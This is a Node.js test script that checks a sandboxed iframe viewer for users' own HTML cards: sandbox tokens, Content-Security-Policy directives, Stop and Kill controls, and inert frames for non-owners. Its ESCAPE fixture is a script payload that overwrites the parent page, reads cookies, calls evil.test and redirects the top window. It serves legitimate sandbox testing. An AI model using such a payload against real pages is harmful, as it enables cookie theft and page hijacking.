#!/usr/bin/env node
require("./_env-guard");
// S1/S1m sandbox face (desk-html-view.js): an owner's own HTML card runs its JS in an iframe with
// sandbox="allow-scripts" only (no allow-same-origin: opaque origin, so no AIA cookies, session,
// parent DOM or other cards), a CSP with connect-src 'none' (no network), inline/data/blob media only,
// an author tag, and Stop+Kill outside the frame (S1m: ≥44px touch chrome, single-column, capped height).
// Anyone else, or any other card, keeps the inert sandbox="".
// Read-only: loads the file into a vm with a tiny DOM stub. AIA_SBX_FILE overrides the file (mutants).
const fs = require("fs");
const path = require("path");
const vm = require("vm");

const root = path.join(__dirname, "..");
const file = process.env.AIA_SBX_FILE || path.join(root, "desk-html-view.js");
const src = fs.readFileSync(file, "utf8");
function fail(m) { console.error("check-sandbox-face: " + m); process.exit(1); }

function node(tag) {
  const n = { tagName: String(tag).toUpperCase(), attrs: {}, children: [], textContent: "", className: "" };
  n.setAttribute = function (k, v) { n.attrs[k] = String(v); };
  n.getAttribute = function (k) { return Object.prototype.hasOwnProperty.call(n.attrs, k) ? n.attrs[k] : null; };
  n.addEventListener = function (t, fn) { (n.ev = n.ev || {})[t] = fn; };
  n.appendChild = function (c) { n.children.push(c); c.parent = n; return c; };
  n.remove = function () { if (n.parent) n.parent.children = n.parent.children.filter(function (c) { return c !== n; }); };
  n.querySelector = function (sel) {
    const cls = sel.replace(/^\./, "");
    const walk = function (x) { for (const c of x.children) { if ((" " + c.className + " ").indexOf(" " + cls + " ") >= 0) return c; const r = walk(c); if (r) return r; } return null; };
    return walk(n);
  };
  return n;
}
function makeCtx(roleName, fetchText) {
  const listeners = {};
  const fetched = [];
  const ctx = {
    role: roleName,
    console: console,
    setTimeout: function (fn) { fn(); },
    document: {
      head: node("head"), body: node("body"),
      getElementById: function () { return null; },
      createElement: node,
      querySelectorAll: function () { return []; },
      addEventListener: function (t, fn) { listeners[t] = fn; }
    },
    fetch: function (u, o) { fetched.push([u, o]); return Promise.resolve({ ok: true, text: function () { return Promise.resolve(fetchText); } }); }
  };
  ctx.window = ctx;
  ctx.safeUrl = function (u) { return /^(https:|\/)/.test(u) ? u : ""; };
  ctx.AIACardThread = { tagOf: function (r) { return r.from === "desk" ? "You" : "Helper"; } };
  vm.runInNewContext(src, ctx, { filename: "desk-html-view.js" });
  ctx._listeners = listeners; ctx._fetched = fetched;
  return ctx;
}
const ESCAPE = "<script>parent.document.body.innerHTML='x';document.cookie;fetch('https://evil.test');top.location='https://evil.test'</script>";
const own = { from: "desk", files: [{ url: "/api/upload?id=face", name: "face.html", kind: "text/html" }] };
const other = { from: "helper", files: [{ url: "/api/upload?id=face", name: "face.html", kind: "text/html" }] };

function sandboxOk(sb, where) {
  if (sb !== "allow-scripts") fail(where + ": sandbox must be exactly allow-scripts, got " + JSON.stringify(sb));
  if (/allow-same-origin/.test(sb)) fail(where + ": allow-same-origin opens parent DOM / cookies / other cards");
}
function cspOk(csp, where) {
  if (!/(^|;)\s*default-src 'none'/.test(csp)) fail(where + ": CSP needs default-src 'none'");
  if (!/(^|;)\s*connect-src 'none'/.test(csp)) fail(where + ": CSP needs connect-src 'none' (no network)");
  ["frame-src 'none'", "worker-src 'none'", "form-action 'none'", "base-uri 'none'"].forEach(function (d) {
    if (csp.indexOf(d) < 0) fail(where + ": CSP needs " + d);
  });
  const media = (csp.match(/(img|media|font)-src [^;]*/g) || []).join(" ");
  if (/https?:|\*|'self'/.test(media)) fail(where + ": S1 media must be inline/data/blob only: " + media);
  if (/script-src[^;]*(https?:|\*|'self')/.test(csp)) fail(where + ": script-src must stay inline only");
}

(async function () {
  // Static escape guards on the file.
  if (/allow-same-origin|allow-top-navigation|allow-popups|allow-forms|allow-modals/.test(src)) fail("file grants an escape sandbox token");
  if (/addEventListener\(\s*["']message["']|postMessage\(/.test(src)) fail("parent must not open a message channel to card faces");
  if (/innerHTML\s*=/.test(src)) fail("face bytes must never go through innerHTML");
  // S1m: Kill must not invent job-kill from the face (no confirmKill / window["kill"] wiring).
  if (/\bconfirmKill\s*\(|window\s*\.\s*kill\s*\(|window\s*\[\s*["']kill["']\s*\]/.test(src)) fail("face Kill must not wire to job-kill");

  // Owner's own card: script face, author tag, Stop+Kill outside frame.
  const ctx = makeCtx("owner", ESCAPE);
  const api = ctx.AIASandboxFace;
  if (!api) fail("AIASandboxFace missing");
  sandboxOk(api.SANDBOX, "SANDBOX");
  cspOk(api.CSP, "CSP");
  const html = ctx.filesHtml(own);
  if (!/class="q-html pack-face q-sbx"/.test(html)) fail("owner's own HTML card must use the sandbox face (same pack-face pipeline)");
  if (/<iframe/.test(html)) fail("script face must not be a string iframe; it mounts via DOM srcdoc");
  if (!/data-sbx-stop/.test(html)) fail("Stop chrome missing");
  if (!/data-sbx-kill/.test(html)) fail("Kill chrome missing");
  if (!/class="q-sbx-chrome"/.test(html)) fail("S1m chrome bar missing");
  // Stop+Kill must appear before the slot in the HTML string (outside iframe/slot).
  const stopAt = html.indexOf("data-sbx-stop");
  const killAt = html.indexOf("data-sbx-kill");
  const slotAt = html.indexOf("q-sbx-slot");
  if (stopAt < 0 || killAt < 0 || slotAt < 0 || !(stopAt < slotAt && killAt < slotAt)) fail("Stop+Kill must sit outside the slot/iframe");

  // Injected CSS: touch ≥44px, no float-right Stop, single-column sheet, height cap.
  const style = ctx.document.head.children[0];
  const css = style && style.textContent || "";
  if (!css) fail("face CSS not injected");
  if (/float\s*:\s*right/.test(css)) fail("S1m: Stop must not float:right (single-column chrome)");
  if (!/\.q-sbx\{[^}]*flex-direction:\s*column/.test(css) && css.indexOf(".q-sbx{display:flex;flex-direction:column}") < 0) fail("S1m: .q-sbx must be single-column flex");
  if (!/\.q-sbx-stop,\.q-sbx-kill\{[^}]*min-height:44px/.test(css) && css.indexOf("min-height:44px") < 0) fail("S1m: Stop+Kill need min-height:44px");
  if (css.indexOf("min-width:44px") < 0) fail("S1m: Stop+Kill need min-width:44px");
  if (css.indexOf(".q-sbx-slot{min-height:160px}") < 0 && !/\.q-sbx-slot\{[^}]*min-height:\s*160px/.test(css)) fail("S1m: .q-sbx-slot needs min-height:160px");
  if (css.indexOf("max-height:min(36vh,280px)") < 0 && !/max-height:\s*min\(\s*36vh\s*,\s*280px\s*\)/.test(css)) fail("S1m: script face iframe needs max-height:min(36vh,280px)");

  const box = node("div"); box.className = "q-html pack-face q-sbx";
  const m = /data-sbx-src="([^"]*)" data-sbx-from="([^"]*)" data-sbx-ak="([^"]*)" data-sbx-who="([^"]*)"/.exec(html);
  if (!m) fail("face box attrs missing");
  box.setAttribute("data-sbx-src", m[1]); box.setAttribute("data-sbx-from", m[2]); box.setAttribute("data-sbx-ak", m[3]); box.setAttribute("data-sbx-who", m[4]);
  const label = node("span"); label.className = "q-sbx-by"; box.appendChild(label);
  const chrome = node("div"); chrome.className = "q-sbx-chrome"; box.appendChild(chrome);
  const stopB = node("button"); stopB.className = "q-sbx-stop"; stopB.setAttribute("data-sbx-stop", "1"); chrome.appendChild(stopB);
  const killB = node("button"); killB.className = "q-sbx-kill"; killB.setAttribute("data-sbx-kill", "1"); chrome.appendChild(killB);
  const slot = node("div"); slot.className = "q-sbx-slot"; box.appendChild(slot);
  api.mountOne(box);
  await new Promise(function (r) { setImmediate(r); });
  if (label.textContent !== "by You") fail("author tag missing on face: " + JSON.stringify(label.textContent));
  const fr = slot.children[0];
  if (!fr || fr.tagName !== "IFRAME") fail("owner face did not mount an iframe");
  if (fr.parent === stopB || stopB.parent === slot || killB.parent === slot) fail("Stop/Kill must sit outside the iframe");
  if (chrome.parent !== box) fail("chrome bar must stay on the face box");
  sandboxOk(fr.getAttribute("sandbox"), "mounted iframe");
  cspOk(fr.getAttribute("csp") || "", "iframe csp attr");
  if (fr.getAttribute("src")) fail("script face must use srcdoc, not a network src");
  if (fr.getAttribute("allow") !== "") fail("script face must grant no permissions (allow=\"\")");
  if (fr.getAttribute("referrerpolicy") !== "no-referrer") fail("script face must send no referrer");
  const doc = String(fr.srcdoc || "");
  if (doc.indexOf("<meta http-equiv=\"Content-Security-Policy\"") !== 0) fail("CSP meta must be the first bytes of the face");
  cspOk(/content="([^"]*)"/.exec(doc)[1], "srcdoc meta");
  if (doc.indexOf(ESCAPE) < 0) fail("face bytes must reach the frame unchanged (inside the jail)");
  // A face that navigates itself (second load) is stopped.
  if (!fr.ev || typeof fr.ev.load !== "function") fail("face must watch its own load to stop a navigate-away");
  fr.ev.load(); if (box.getAttribute("data-sbx-stopped")) fail("first load must not stop the face");
  fr.ev.load(); if (!box.getAttribute("data-sbx-stopped")) fail("a second load (navigate-away) must stop the face");
  box.attrs["data-sbx-stopped"] = undefined; delete box.attrs["data-sbx-stopped"]; slot.textContent = "";
  // Stop hides the face and kills its JS.
  api.stop(box);
  if (slot.children.length && slot.textContent !== "Stopped.") fail("Stop must drop the frame");
  if (slot.textContent !== "Stopped.") fail("Stop must hide the face");

  // Other cards / other viewers stay inert.
  ["employee", "helper", "", undefined].forEach(function (r) {
    const c = makeCtx(r, ESCAPE);
    const h = c.filesHtml(own);
    if (/q-sbx|allow-scripts/.test(h)) fail("non-owner viewer (" + r + ") got a script face");
    if (!/sandbox=""/.test(h)) fail("non-owner viewer must keep inert sandbox=\"\"");
  });
  const c2 = makeCtx("owner", ESCAPE);
  if (/q-sbx/.test(c2.filesHtml(other))) fail("a card the owner did not make must not run scripts");
  // Card-thread not loaded yet: re-checked at mount, falls back inert.
  const c3 = makeCtx("owner", ESCAPE);
  const b3 = node("div"); b3.setAttribute("data-sbx-src", "/api/upload?id=face"); b3.setAttribute("data-sbx-from", "helper");
  const s3 = node("div"); s3.className = "q-sbx-slot"; b3.appendChild(s3);
  c3.AIASandboxFace.mountOne(b3);
  await new Promise(function (r) { setImmediate(r); });
  if (!s3.children[0] || s3.children[0].getAttribute("sandbox") !== "") fail("not-own card at mount must get the inert frame");
  if (c3._fetched.length) fail("not-own card must not fetch face bytes");
  console.log("check-sandbox-face: ok");
})().catch(function (e) { fail(e && e.stack || String(e)); });
